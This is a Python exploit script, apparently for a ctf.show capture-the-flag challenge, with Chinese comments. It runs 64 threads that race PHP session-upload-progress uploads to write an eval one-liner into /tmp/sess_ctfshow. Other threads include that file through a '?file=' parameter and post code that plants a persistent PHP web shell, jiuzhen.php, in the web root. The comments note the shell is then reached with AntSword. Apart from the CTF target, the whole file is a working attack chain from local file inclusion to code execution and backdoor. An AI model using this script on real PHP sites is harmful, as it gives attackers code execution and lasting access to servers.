import requests
import io
import threading

url='http://c218b7f4-c631-4d4c-ba8a-0171b7dc4e15.challenge.ctf.show/:8080/'
sessionid='ctfshow'
data={
	"1":"file_put_contents('/var/www/html/jiuzhen.php','<?php eval($_POST[3]);?>');"
}
#这个是访问/tmp/sess_ctfshow时，post传递的内容，是在网站目录下写入一句话木马。这样一旦访问成功，就可以蚁剑连接了。
def write(session):#/tmp/sess_ctfshow中写入一句话木马。
	fileBytes = io.BytesIO(b'a'*1024*50)
	while True:
		response=session.post(url,
			data={
			'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'
			},
			cookies={
			'PHPSESSID':sessionid
			},
			files={
			'file':('ctfshow.jpg',fileBytes)
			}
			)

def read(session):#访问/tmp/sess_ctfshow，post传递信息，在网站目录下写入木马。
	while True:
		response=session.post(url+'?file=/tmp/sess_'+sessionid,data=data,
			cookies={
			'PHPSESSID':sessionid
			}
			)
		resposne2=session.get(url+'jiuzhen.php');#访问木马文件，如果访问到了就代表竞争成功
		if resposne2.status_code==200:
			print('++++++done++++++')
		else:
			print(resposne2.status_code)

if __name__ == '__main__':

	evnet=threading.Event()
	#写入和访问分别设置5个线程。
	with requests.session() as session:
		for i in range(64):
			threading.Thread(target=write,args=(session,)).start()
		for i in range(64):
			threading.Thread(target=read,args=(session,)).start()

	evnet.set()



